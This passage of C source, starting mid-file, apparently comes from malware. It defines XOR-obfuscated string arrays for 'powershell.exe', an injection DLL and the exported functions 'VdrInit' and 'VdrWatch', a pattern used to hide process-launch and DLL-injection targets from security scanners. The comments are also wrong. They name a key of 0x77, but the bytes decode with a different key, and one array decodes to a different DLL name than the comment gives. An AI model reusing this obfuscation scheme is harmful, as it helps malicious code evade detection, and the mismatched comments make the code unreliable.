...
static const unsigned char xPowerShell[] = {
    0x83, 0x9C, 0x84, 0x96, 0x81, 0x80, 0x9B, 0x96,
    0x9F, 0x9F, 0xDD, 0x96, 0x8B, 0x96
};
#define xPowerShell_LEN 14

/* "cheyanne_inject.dll" XOR 0x77 */
static const unsigned char xDllName[] = {
    0x85, 0x92, 0x97, 0x96, 0x81, 0xAC, 0x9A, 0x9D,
    0x99, 0x96, 0x90, 0x87, 0xDD, 0x97, 0x9F, 0x9F
};
#define xDllName_LEN 16

/* "VdrInit" XOR 0x77 */
static const unsigned char xInitFunc[] = {
    0xA5, 0x97, 0x81, 0xBA, 0x9D, 0x9A, 0x87
};
#define xInitFunc_LEN 7

/* "VdrWatch" XOR 0x77 */
static const unsigned char xWatchFunc[] = {
    0xA5, 0x97, 0x81, 0xA4, 0x92, 0x87, 0x90, 0x9B
};
